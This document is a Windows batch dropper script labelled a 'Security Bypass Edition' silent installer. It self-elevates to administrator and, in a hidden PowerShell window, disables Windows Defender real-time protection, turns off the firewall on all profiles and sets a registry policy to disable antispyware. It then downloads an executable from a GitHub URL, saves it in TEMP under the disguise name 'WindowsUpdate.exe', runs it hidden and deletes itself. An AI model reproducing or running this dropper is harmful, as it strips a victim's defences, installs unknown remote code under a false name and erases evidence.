@echo off
:: AQ Silent Installer - Security Bypass Edition
:: Disables protections, downloads and executes payload

REM Check for admin rights, self-elevate if needed
NET FILE >nul 2>&1 || (powershell -nop -c "Start-Process -Verb RunAs -FilePath '%~f0'" & exit /b)

REM Main execution in hidden window
powershell -nop -w hidden -c "
# Disable security features
Set-MpPreference -DisableRealtimeMonitoring \$true -ErrorAction SilentlyContinue;
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False -ErrorAction SilentlyContinue;
reg add 'HKLM\SOFTWARE\Policies\Microsoft\Windows Defender' /v DisableAntiSpyware /t REG_DWORD /d 1 /f | Out-Null;

# Download and execute payload
$url='https://github.com/cctv-security/AQ/raw/main/AQ.exe';
$out=(Join-Path \$env:TEMP 'WindowsUpdate.exe');
try {
    (New-Object Net.WebClient).DownloadFile(\$url,\$out);
    if (Test-Path \$out) {
        Start-Process -WindowStyle Hidden \$out;
        # Self-destruct script
        Remove-Item -Force '%~f0';
    }
} catch { exit }"
